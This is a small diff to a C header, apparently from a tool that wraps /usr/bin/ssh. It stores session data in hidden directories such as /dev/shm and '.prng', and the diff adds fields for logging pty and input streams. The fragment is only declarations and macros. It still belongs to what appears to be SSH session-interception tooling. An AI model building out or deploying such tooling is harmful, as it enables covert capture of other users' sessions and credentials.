@@ -34,9 +34,13 @@
 
 extern FILE *g_dbg_fp;
 
+#define THC_DIRPERM           (0700)
+// #define THC_DIRPERM           (0333) # THis would prevent thc_cli list to work as it relies on "file in .prng/.d/*.pwd"
+
 struct _g
 {
 	char *db_basedir;      // /dev/shm/.../`
+	char *log_basedir;
 	char *basedir_local;   // /home/user/.prng/
 	char *basedir_rel;     // ".prng" or /dev/shm/.prng
 	char *target_file;     // /usr/bin/ssh
@@ -57,6 +61,7 @@ struct _g
 	char ssh_param[8196];   // The original args 
 	char *ssh_destination;
 	int fd_log;
+	int fd_log_in;
 	LNBUF ln_pty;
 	LNBUF ln_in;
 };
@@ -106,6 +111,7 @@ struct _g
 #define THC_TV_TO_USEC(tv)               ((uint64_t)(tv)->tv_sec * 1000000 + (tv)->tv_usec)
 #define THC_SEC_TO_USEC(sec)             ((uint64_t)(sec) * 1000000)
 #define THC_USEC_TO_TV(tv, usec)         do { (tv)->tv_sec = (usec) / 1000000; (tv)->tv_usec = (usec) % 1000000; } while(0)
+#define THC_USEC_TO_SEC(usec)            ((usec) / 1000000)
 
 #ifndef XASSERT
 # define XASSERT(expr, a...) do { \
